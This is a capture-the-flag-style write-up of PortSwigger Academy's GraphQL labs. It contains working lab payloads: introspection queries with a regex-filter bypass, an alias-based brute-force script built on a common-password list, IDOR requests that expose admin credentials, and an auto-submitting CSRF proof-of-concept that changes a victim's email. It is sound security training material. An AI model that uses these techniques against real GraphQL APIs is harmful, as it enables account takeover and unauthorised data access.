# GraphQL API vulnerabilities [PortSwigger Academy]

<sup>This write-up covers the GraphQL API vulnerabilities section of Web Security Academy by PortSwigger.</sup>

## Finding GraphQL endpoints

Before you can begin testing a GraphQL API, you must first locate its endpoint. Since all GraphQL requests are sent to the same endpoint, finding it is crucial. 

> NOTE: This section covers how to manually search for GraphQL endpoints. however, Burp Scanner can automate this process during scans and will flag any discovered endpoints with a "GraphQL endpoint found" alert

Also, to effectively guard against clickjacking and XSS, Content Security Policies (CSPs) must be carefully designed, implemented, and tested, and should be part of a broader, layered security approach. 

### Universal queries

If you send the query `query{__typename}` to a GraphQL endpoint, the response will contain the string `{"data": {"__typename": "query"}}`. This is called a __universal query__ and it's a handy method to check if a URL is linked to a GraphQL service.

This works because every GraphQL endpoint has a special field named `__typename` that returns the type of the object being queried as a string. 

### Common endpoint names

GraphQL services typically follow common patterns for their endpoint paths. When probing for GraphQL endpoints, you should try sending universal queries to locations like:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

### Common endpoint names - Continued

If the usual endpoints don't produce a GraphQL response, you can also try adding `/v1` at the end of the path. 

> NOTE: GraphQL services often reply to non-GraphQL requests with errors like "query not present" or something similar. Keep this in mind when probing for GraphQL endpoints.

### Request methods

The next step in locating GraphQL endpoints is to experiment with different HTTP request methods. 

Ideally, production GraphQL endpoints should only accept `POST` requests with a `Content-Type` of `application/json` to help defend against CSRF attacks. However, some servers might also allow other methods, like `GET` requests or `POST` requests with a `Content-Type` of `x-www-form-urlencoded`.

If sending `POST` requests to typical endpoints doesn't reveal the GraphQL service, try resending the universal query using other HTTP methods instead. 

### Initial testing

After finding the endpoint, you can start sending test requests to learn more about its behavior. If the endpoint supports a website, before the site using Burp's browser and review the HTTP history to see the queries being made. 

## Exploiting unsanitized arguments

Now you can begin looking for vulnerabilities, starting with testing query arguments.

If the API uses arguments to directly retrieve objects, it might be susceptible to access control issues. This could allow a user to view data they shouldn't have access to by simply providing a different argument value. This type of flaw is often referred to as an insecure direct object reference (IDOR)

### Exploiting unsanitized arguments - Continued

For instance, consider the following query that requests a list of products from an online store:

```graphql
# Example product query
query {
  products {
    id
    name
    listed
  }
}
```

The response only includes products that are currently listed:

```json
# Example product response
{
  "data": {
    "products": [
      { "id": 1, "name": "Product 1", "listed": true },
      { "id": 2, "name": "Product 2", "listed": true }, 
      { "id": 4, "name": "Product 4", "listed": true}
    ]
  }
}
```

From this, we can observe: 
- Product IDs appear to be sequential
- Product ID 3 is absent, which might suggest it has been removed or delisted.

By directly querying for the missing ID, we can retrieve information about the hidden product, even though it wasn't shown in the original list:

```graphql
# Query to retrieve the missing product
query {
  product(id: 3) {
    id
    name
    listed
  }
}
```

```json
# Response for missing product
{
  "data": {
    "product": {
      "id": 3,
      "name": "Product 3",
      "listed": false
    }
  }
}
```

## Discovering schema information

The next phase of API testing involves gathering details about the underlying schema. 

The most effective method for this is using introspection queries. Introspection is a built-in feature of GraphQL that allows you to request information about the server's schema. 

This process not only helps you understand how to interact with the GraphQL API but might also reveal sensitive information, like the content of description fields. 

### Using introspection

To discover schema information using introspection, you need to query the `__schema` field. This field is accessible from the root type of any query.

Similar to regular queries, you can specify the fields and structure of the response when performing an introspection query. For example, if you're only interested in obtaining the names of available mutations, you can request that information specifically. 

> NOTE: Burp Suite can help you generate introspection queries automatically. For more details, refer to the section on accessing GraphQL API schemas through introspection. 

### Probing for introspection

Disabling introspection in production environments is considered a best practice, but this is not always implemented.

You can check if introspection is enbaled by sending the following simple query. If introspection is active, the response will list the names of all available queries. 

```graphql
# Introspection probe request
{
  "query": "{__schema{queryType{name}}}"
}
```

> NOTE: Burp Scanner can automatically detect introspection during its scans. If it identifies that introspection is enabled, it will flag the issue as "GraphQL introspection enabled."

### Running a full introspection query

The next step is to execute a comprehensive introspection query on the endpoint to gather as much information as possible about the underlying schema. 

The example query provided below retrieves full details about all queries, mutations, subscriptions, types and fragments:

```graphql
#Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #May need to be removed to execute query
        onFragment   #May need to be removed to execute query
        onField      #May need to be removed to execute query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

> NOTE: If introspection is enabled but the above query does not execute, you may need to remove the `onOperation`, `onFragment`, and `onField` directives from the query. Many endpoints do not support these directives in introspection queries, and removing them can increase the changes of a successful introspection attempt.

### Visualizing introspection results

Responses to introspection queries can contain a wealth of information, but they are often lengthy and difficult to interpret. 

To make understanding schema relationships easier, you can use a GraphQL visualizer. This online tool takes the output from an introspection query and creates a visual map of the data, highlighting the relationships between various operations and types. 

### Suggestions

Even if introspection is completely disabled, you may still be able to gather insights into an API's structure through suggestions.

Suggestions are a feature of the Apollo GraphQL platform, where the server provides query recommendations in error messages. These are typically triggered when a query is slightly off but still recognizable (for example, "There is no entry for `productInfo`. Did you mean `productInformation` instead?").

By examining these suggestions, you can potentially uncover valuable information, as the response reveals valid parts of the schema. 

### Suggestions - Continued

Clairvoyance is a tool that leverages suggestions to automatically reconstruct all or part of a GraphQL schema, even when introspection is turned off. This greatly reduces the time needed to gather information from suggestion responses. Suggestions cannot be disabled directly in Apollo. 

> NOTE: Burp Scanner can automatically detect suggestions during its scans. If suggestions are enabled, if will flag a "GraphQL suggestions enabled" issue. 

### Lab: Accessing private GraphQL posts

Access the blog page in Burp's browser. In __Proxy__ > __HTTP history__ observe, that blog posts are fetched via a GraphQL query, each blog post has a unique sequential ID in the GraphQL response and the blog post with ID 3 is missing indicating it is hidden:

_Request:_

```
POST /graphql/v1 HTTP/2
...

{
  "query": "\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}",
  "operationName":"getBlogSummaries"
}
```

Right click the above request and "Send to Repeater". Once there, right-click the request panel and select "GraphQL > Set introspection query" to insert an introspection query into the request body. 

Click Send and check the response. You'll find that the `BlogPost` type includes a `postPassword` field:

```json
{
  "kind": "OBJECT",
  "name": "BlogPost",
  "description": null,
  "fields": [
  ...
    {
      "name": "postPassword",
      "description": null,
      "args": [],
      "type": {
        "kind": "SCALAR",
        "name": "String",
        "ofType": null
      },
      "isDeprecated": false,
      "deprecationReason": null
    }
  ....
  ]
}
```

> __NOTE__: View any post on the lab web page before continuing. 

In __Proxy__ > __HTTP history__ locate the `POST /graphql/v1` request that comes directly after `/post?postId=` and send it to repeater. 

In __Repeater__ click on the GraphQL tab. In the variables panel below, change the `id` variable to `3` (the ID of the hidden blogpost): 

```json
{
  "id": 3
}
```

In the _Query_ panel on top add the `postPassword` field to the query:

```

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            postPassword
            image
            title
            author
            date
            paragraphs
        }
    }
```

Click send, copy the `postPassword` value that is returned in the response and paste int into the Submit solution dialogue to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### Lab: Accidental exposure of private GraphQL fields

In Burp's browser, navigate to the lab and click on "My account." Attempt to log in with fake credentials like `admin:admin`. 

In __Proxy__ > __HTTP history__ find the `POST /login` request and observe that the attempt is being sent as a GraphQL mutation containing both username and password:

_Request body:_
```
{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"admin","password":"admin"}}}
```

Send it to __Repeater__. Right click on the request panel and select "GraphQL > Set introspection query" and click Send. Look at the response message JSON in the Response panel, right-click on it and select "GraphQL > Save GraphQL queries to site map". 

Go to __Target__ > __Site map__. On the left panel drop down to __Website__ > __`graphql`__ > __`v1`__. 

Notice that in that list, there is a `getUser` query made in the request with the following body:

```
{"query":"query($id: Int!) {\n  getUser(id: $id) {\n    id\n    username\n    password\n  }\n}","variables":{"id":0}}
```

Send this request to __Repeater__ and send the request. Notice that request with user `id` value of `0` returns nothing. Navigate to __GraphQL__ tab on the Request panel and in the __Variables__ pane change `id` variable to `1`. Resend the request. 

Notice that it returned `administrator` user's password in the response body. Log in as `administrator` with that password on the website. 

Navigate to "Admin panel" and delete user `carlos` to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## Bypassing GraphQL introspection defenses

If you're unable to execute introspection queries on the API you're testing, try adding a special character after the `__schema` keyword. 

When developers disable introspection, they might use a regex to block the `__schema` keyword in queries. You can experiment with characters like spaces, new lines, and commas, as these are ignored by GraphQL but may still be caught by faulty regex filtering. 

For example, if the developer has only excluded `__schema{`, the following introspection query could bypass the restriction:

```graphql
#Introspection query with newline

{
    "query": "query{__schema
    {queryType{name}}}"
}
```

If this approach doesn't work, you can try running the probe using an alternative request method. Introspection might only be disabled for `POST` requests, so you could attempt a `GET` request or a `POST` request with a `content-type` of `x-www-form-urlencoded`. 

### Bypassing GraphQL introspection defenses - Continued

The example below shows an introspection probe sent via `GET`, with URL encoded parameters:

```
# Introspection probe as GET request

GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

> NOTE: You can save GraphQL queries to the site map. 

### Lab: Finding a hidden GraphQL endpoint

In Burp's browser navigate to the lab. In __Proxy__ > __HTTP history__ find the very first `GET /` request, right-click it and send it to __Repeater__. 

Send requests to some common GraphQL endpoint suffixes and inspect the results. This is what I tried:

`POST /graphql/v1`:

```
HTTP/2 404 Not Found
...

"Not Found"
```

`POST /graphql`:

```
HTTP/2 404 Not Found
...

"Not Found"
```

`POST /api`:

```
HTTP/2 405 Method Not Allowed
Allow: GET
Content-Type: application/json; charset=utf-8
...

"Method Not Allowed"
```

Looks like we found the endpoint and it allows only `GET` requests. So the next thing I tried was `GET /api`:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
...

"Query not present"
```

This suggests that `/api` GraphQL endpoint might respond to `GET` requests with specific queries. Let's try some:

```
GET /api?query=query{__typename} HTTP/2
```

Returns:

```
{
  "data": {
    "__typename": "query"
  }
}
```

Now right-click the request pane in __Repeater__ and select "GraphQL" > "Set introspection query. This will add an introspection query string to the `GET /api` request. Click Send:
```
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

The message reads "introspection is not allowed". Let's try adding a newline character after `__schema` and resend. A newline character has to be URL encoded as `%0a` so it would look like `__schema%0a+%` in the query. 

Now the response includes the full introspection details. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query. 

Now in __Repeater__ right-click the response panel and select "GraphQL" > "Save GraphQL queries to site map". 

Go to __Target__ > __Site map__ and drop down the tree on the left pane to __`api`__. Find a `getUser` query (you can do this by clicking on the request and changing to _GraphQL_ tab, where it cleans up the notation:

```graphql
query($id: Int!) {
  getUser(id: $id) {
    id
    username
  }
}
```

But it is also quite visible in the Request panel if your eyes can handle it:

```
GET /api?query=query%28%24id%3a+Int%21%29+%7b%0a++getUser%28id%3a+%24id%29+%7b%0a++++id%0a++++username%0a++%7d%0a%7d&variables=%7b%22id%22%3a0%7d HTTP/1.1
```

> NOTE: Once you send the following request to Repeater and send it might return a "Body cannot be empty" message. Right-click request panel and select "Change request method" so it changes to `POST` and then do it again, to change back to `GET`. It should work then. 

If you can spot a `getUser` query in there, right-click the request and send to __Repeater__. Change to the __GraphQL__ tab and there you can see that in the __Variables__ panel the `id` variable is set to `0` which returns `null`. Change the `id` variable's value and send until it returns credentials of user `carlos`. It appears `id` for carlos is `3`.

Go back to __Target__ > __Site map__ and find another request with a GraphQL query `deleteOrganizationUser`. Notice that this mutation takes `id` as a parameter. Send this request to __Repeater__. 

In Repeater, change to GraphQL tab and edit `id` variable and set it to `3`. Send the request to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy

> Check out this [primer](primer/README.md) I wrote for using GraphQL schema to build queries.

> Check out this neat little [tool](https://github.com/gremlin-0x/gql_viper) I wrote to automatically get GraphQL schema and build queries for a specified HTTP method. 

## Bypassing rate limiting using aliases

Normally, GraphQL objects aren't allowed to have multiple fields with the same name. However, by using __aliases__, you can work around this limitation by assigning unique names to each field you want the API to return. This allows you to request several instances of the same object type with a single query. 

Although aliases are mainly designed to reduce the number of API calls needed, they can also be exploited to __burte force__ a GraphQL endpoint.

In many cases, endpoints are protected by rate limiters that restrict the number of incoming HTTP requests. However, since aliases let you bundle multiple queries into one HTTP request, they can be used to bypass these rate-limiting protections.

### Bypassing rate limiting using aliases - Continued

The example below demonstrates how aliased queries can be used to check multiple store sicount codes within a single request. Although it's only one HTTP request, it could still be used to validate a large number of discount codes at once, potentially bypassing rate-limiting protections. 

```graphql
# Request using aliased queries

query isValidDiscount($code: Int) {
    isvalidDiscount(code: $code) {
        valid
    }
    isValidDiscount2: isValidDiscount(code: $code) {
        valid
    }
    isValidDiscount3: isValidDiscount(code: $code) {
        valid
    }
}
```

### Lab: Bypassing GraphQL brute force protections

In Burp's browser go to "My account" and attempt a login with `admin:admin`. Go to __Proxy__ > __HTTP history__ and notice that login requests are sending as `POST /graphql/v1` GraphQL mutations:

```graphql
{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"admin","password":"admin"}}}
```

Send that request to __Repeater__. Press send a couple of times, until it returns an error:

```json
{
  "errors": [
    {
      "path": [
        "login"
      ],
      "extensions": {
        "message": "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
      },
      "locations": [
        {
          "line": 3,
          "column": 9
        }
      ],
      "message": "Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s)."
    }
  ],
  "data": {
    "login": null
  }
}
```

In __Repeater__ navigate to __GraphQL__ tab on the Request panel and craft a request that uses aliases to send multiple login mutations in one message. In the Tip section an example JavaScript is provided to generate aliases:

```javascript
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

The tip suggests to open a browser console, paste it there and it will be copied to your clipboard. In the __GraphQL__ tab in Repeater's Request panel add it to the GraphQL query, like this:

```graphql
mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    	bruteforce0:login(input:{password: "123456", username: "carlos"}) {
			token
			success
		}
        ....
        ....
        ....
        bruteforce99:login(input:{password: "moscow", username: "carlos"}) {
			token
			success
		}
}
```

So essentially, within the `mutation {}` type. That way it will try 99 mutation requests with username `carlos` and different passwords. 

In the response there's a result for each given alias. Go through them and find, which one has `success` set to `true` in the response:

```json
   "bruteforce55": {
      "token": "sab8DMdoz8yvUISLAOCcLL1BaUZId78l",
      "success": true
    },
```

Check which password was used in the alias `bruteforce55`, log in as `carlos` with that password to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## GraphQL CSRF

Cross-site request forgery (CSRF) is a vulnerability that allows attackers to trick users into carrying out uninteded actions. This typically involves a malicious website sending unauthorized requests to a vulnerable application on behalf of the user. 

In the context of GraphQL, CSRF can be exploited by crafting an attack that triggers a user's browser to submit a harmful GraphQL query, making it appear as though the user initiated it. 

### How do CSRF over GraphQL vulnerabilities arise?

CSRF vulnerabilities can occur when a GraphQL endpoint doesn't check the request's content type and lacks CSRF token protections.

Requests using the `application/json` content type are generally safe from CSRF as long as the server enforces strict content-type validation. In such cases, a malicious site cannot trick the victim's browser into sending these requests. 

However, requests made with methods like `GET` or with a content type of `x-www-form-urlencoded` _can_ be triggered by a browser. If the GraphQL endpoint accepts these formats, it may be vulnerable to CSRF attacks, allowing attackers to craft and deliver malicious requests to the API. 

The process of carrying out a CSRF attack on a GraphQL endpoint is essentially the same as with traditional CSRF attacks.

### Lab: performing CSRF exploits over GraphQL

Open Burp's browser, access the lab and log in as `wiener:peter`. Update email with a new email address. 

In __Proxy__ > __HTTP history__ find the latest `POST /graphql/v1` request, with body:

```json
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"attacker@fakemail.com"}}}
```

The email change is sent as a GraphQL mutation. Right-click this request and "Send to Repeater". Go to GraphQL tab within the request pane and change the value of __Variable__ email to a different email address. Send the request and notice that it changed the email:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 88

{
  "data": {
    "changeEmail": {
      "email": "attacker@notfakemail.com"
    }
  }
}
```

This indicates that a session cookie can be reused to send multiple requests. 

Convert the request into a `POST` request with a `Content-Type` of `x-www-form-urlencoded`. To do this, right-click the request and select __Change request method__ twice. 

Notice that the mutation request body has been deleted. Add the request body back in with URL encoding:

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

In the browser, navigate to __exploit server__ and paste the following HTML backbone for a CSRF PoC:

```html
<html>
  <form action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
    <input type="hidden" name="" value="">
    <input type="hidden" name="" value="">
    <input type="hidden" name="" value="">
  </form>
  <script>

  </script>
</html>
```

Now carefully follow this:
- Identify parameter _names_ and _values_ in the request body above. 
- Copy and paste the __names__ into the three `<input name=""` fields.
- Copy each __value__ one by one, go to __Decoder__, URL decode it first, and encode as HTML. Then copy and paste it in the `<input value=""` field.

The final PoC should look like this:

```html
<html>
  <form action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
    <input type="hidden" name="query" value="&#x0a;&#x20;&#x20;&#x20;&#x20;&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;">
    <input type="hidden" name="operationName" value="&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;">
    <input type="hidden" name="variables" value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x22;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;">
  </form>
  <script>

  </script>
</html>
```

One last thing. Inside the `<script></script>` block add:

```javascript
document.forms[0].submit();
```

Once your PoC is ready, click "Store" and then "View exploit". You will be redirected to a GraphQL API response:

```json
{
  "data": {
    "changeEmail": {
      "email": "hacker@hacker.com"
    }
  }
}
```

This indicates that your email was changed with this this PoC. To check it go to `/my-account`:

```
Your username is: wiener

Your email is: hacker@hacker.com
```

So change the value of `<input name="variables" value="">` to a different email. Simply copy the initial value from __Repeater__'s request body, go to __Decoder__, URL decode, input any email you haven't used yet, encode as HTML and replace it in the __exploit server__. 

Once that's done, click "Deliver to victim" to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab05_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## Preventing GraphQL attacks

To defend against many common GraphQL attacks, apply the following best practices when deploying your API in a production environment:

- _Disable introspection_ if your API isn't meant to be accessed by the public. This limits the information available to attackers and helps prevent uninteded data exposure. 
- _If your API is public-facing_, you may need to keep introspection enabled for legitimate use. In this case, carefully audit your schema to ensure no sensitive or unintended fields are exposed.
- _Turn off suggestions_, which are used by tools like Clairvoyance to uncover hidden parts of your schema.
- _Avoid exposing private user information_ in your schema, such as email addresses or user IDs.

## Preventing GraphQL brute-force attacks

GraphQL APIs can sometimes be used to bypass conventional rate limiting mechanisms --- particularly through techniques like using aliases. To help protect your API from brute force attempts and potential denial-of-service (DoS) attacks, it's important to implement defensive design strategies.

To mitigate brute force risks:
- _Enforce query depth limits_ --- query depth refers to how many levels of nested fields a query includes. Deeply nested queries can degrade performance and increase the risk of DoS attacks. Limiting the maximum depth helps prevent these issues.
- _Set operation limits_ --- define upper limits on the number of distinct fields, aliases and top-level operations your API accepts in a single request.
- _Restrict query size_ --- impose a cap on the total byte size of incoming queries to help prevent abuse via oversized payloads.
- _Use cost analysis_ --- this technique evaluates how resource-intensive a query will be before executing it. If a query is deemed too costly, the API can reject it preemptively.

## Preventing CSRF over GraphQL

To protect against GraphQL-specific CSRF vulnerabilities, ensure that your API only accepts JSON-encoded `POST` requests, strictly validates that the content matches the declared content type, and implements a robust CSRF token mechanism to prevent unauthorized cross-origin requests.

> Next write-up: [Cross-origin resource sharing (CORS)](../psa_cors/README.md)
